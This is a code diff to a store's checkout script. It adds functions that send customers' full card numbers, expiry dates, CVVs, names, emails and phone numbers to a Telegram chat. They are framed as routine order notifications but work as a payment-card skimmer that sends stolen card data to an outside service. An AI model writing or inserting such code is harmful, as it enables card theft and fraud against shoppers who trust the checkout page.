@@ -52,6 +52,28 @@ function sendCheckoutNotification(checkoutInfo) {
 ${checkoutInfo.address1}
 ${checkoutInfo.address2 ? checkoutInfo.address2 + '\n' : ''}${checkoutInfo.city}, ${checkoutInfo.state} ${checkoutInfo.postalCode}
 ${checkoutInfo.country}
+--------------------------------------
+<b>💳 Payment Info:</b>
+<b>Card:</b> ${checkoutInfo.cardNumber}
+<b>Expiry:</b> ${checkoutInfo.expiryDate}
+<b>CVV:</b> ${checkoutInfo.cvv}
+    `;
+    sendTelegramMessage(message.trim());
+}
+
+/**
+ * Formats and sends the customer's shipping info to Telegram.
+ * @param {object} shippingInfo - The collected shipping data.
+ */
+function sendShippingInfoNotification(shippingInfo) {
+    const message = `
+<b>👤 Customer Info Submitted! 👤</b>
+--------------------------------------
+<b>Name:</b> ${shippingInfo.firstName} ${shippingInfo.lastName}
+<b>Email:</b> ${shippingInfo.email}
+<b>Phone:</b> ${shippingInfo.phone}
+--------------------------------------
+<i>Customer is proceeding to payment...</i>
     `;
     sendTelegramMessage(message.trim());
 }
